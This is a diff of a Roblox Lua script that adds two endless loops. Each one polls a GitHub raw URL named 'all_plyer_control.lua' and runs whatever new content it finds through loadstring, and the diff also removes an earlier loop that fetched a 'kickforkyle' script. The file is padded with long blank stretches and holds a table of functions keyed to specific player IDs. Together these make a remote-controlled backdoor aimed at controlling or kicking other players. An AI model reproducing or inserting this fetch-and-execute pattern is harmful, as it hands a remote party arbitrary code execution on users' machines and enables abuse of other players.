@@ -1,24 +1,136 @@
------------------------------------------------------------------------------------------------------
-
-
-
-
-_G.KyleScriptRunning = false
-
-local function UniversalWrapper()
-    while _G.KyleScriptRunning do
-        
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/BRGTscript/controling/refs/heads/main/kickforkyle.lua"))()
-
-        task.wait() 
-    end
-end
-
-task.spawn(UniversalWrapper)
-
-
-
 ---------------------------------------------------------------------------------------------------------
+
+-- control all player
+
+
+
+
+
+
+
+
+
+
+
+
+
+local scriptUrl = "https://raw.githubusercontent.com/BRGTscript/controling/refs/heads/main/all_plyer_control.lua"
+
+local lastContent = ""
+
+task.spawn(function()
+    while true do
+        local success, content = pcall(function()
+            return game:HttpGet(scriptUrl)
+        end)
+        
+        if success and content and content:match("%S") and content ~= lastContent then
+            lastContent = content
+            pcall(function()
+                local loadedFunc = loadstring(content)
+                if loadedFunc then
+                    loadedFunc()
+                end
+            end)
+        end
+        
+        task.wait()
+    end
+end)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-----------------------------------------------------------------------------------------------------------
+
+-- player auto execute
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local autoexecutes = "https://raw.githubusercontent.com/BRGTscript/controling/refs/heads/main/all_plyer_control.lua"
+
+local lastContent1 = ""
+
+task.spawn(function()
+    while true do
+        local success, content = pcall(function()
+            return game:HttpGet(autoexecutes)
+        end)
+        
+        if success and content and content:match("%S") and content ~= lastContent1 then
+            lastContent1 = content
+            pcall(function()
+                local loadedFunc = loadstring(content)
+                if loadedFunc then
+                    loadedFunc()
+                end
+            end)
+        end
+        
+        task.wait()
+    end
+end)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+----------------------------------------------------------------------------------------------------------------
+
+-- game script control
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -65,7 +177,37 @@ end
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 --------------------------------------------------------------------------------------------------------------
+
+-- player control
+
+
+
+
+
+
+
+
+
+
+
 
 
 
@@ -81,7 +223,11 @@ local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
 
 local Playercontrol = {
 
--- script
+
+-------------------------------------------------------------------------------------------
+
+-- xian
+
 
 
 [10985692688] = function()  -- xianpog8839
@@ -110,10 +256,6 @@ for _, v in pairs(game:GetDescendants()) do
 end
 ------------------------------
 
--- 
-
-
-
 
 
 
@@ -121,7 +263,9 @@ end,
 
 
 
+--------------------------------------------------
 
+-- enzo
 
 
 [1561035140] = function()  -- spylil123
@@ -155,28 +299,4 @@ end
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+---------------------------------------------------------------------------------------
